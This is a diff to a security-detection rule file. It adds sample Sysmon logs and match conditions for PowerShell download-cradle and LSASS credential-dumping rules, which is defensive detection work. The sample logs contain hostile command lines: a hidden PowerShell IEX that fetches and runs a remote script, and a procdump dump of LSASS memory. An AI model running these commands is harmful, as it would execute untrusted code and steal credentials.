@@ -118,6 +118,26 @@ rules:
         <group>sysmon,process_creation,</group>
       </rule>
     tags: [powershell, download-cradle, malware-delivery, execution]
+    sample_log: |
+      {
+        "timestamp": "2026-04-17T14:32:08Z",
+        "EventCode": 1,
+        "host": "WKS-PC042",
+        "User": "CORP\\j.smith",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')\""
+      }
+    sample_matches:
+      - field: "Image"
+        op: "endswith"
+        value: "\\powershell.exe"
+      - field: "CommandLine"
+        op: "contains"
+        value: "Net.WebClient"
+      - field: "CommandLine"
+        op: "contains"
+        value: "DownloadString"
 
   - name: "LSASS Memory Access — Credential Dumping"
     description: "Detects suspicious access to LSASS process memory — primary technique for credential harvesting on Windows endpoints."
@@ -207,6 +227,27 @@ rules:
         <group>sysmon,credential_access,</group>
       </rule>
     tags: [lsass, credential-dumping, mimikatz, procdump]
+    sample_log: |
+      {
+        "timestamp": "2026-04-17T03:14:55Z",
+        "EventCode": 10,
+        "host": "DC-PRIMARY",
+        "User": "NT AUTHORITY\\SYSTEM",
+        "SourceImage": "C:\\Users\\admin\\Desktop\\procdump64.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1fffff",
+        "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\debug.dmp"
+      }
+    sample_matches:
+      - field: "CommandLine"
+        op: "contains"
+        value: "lsass"
+      - field: "CommandLine"
+        op: "contains"
+        value: "procdump"
+      - field: "Image"
+        op: "not endswith"
+        value: "\\wmiprvse.exe (filter passed)"
 
   # ══════════════════════════════════════════════════════════
   # BRUTE FORCE
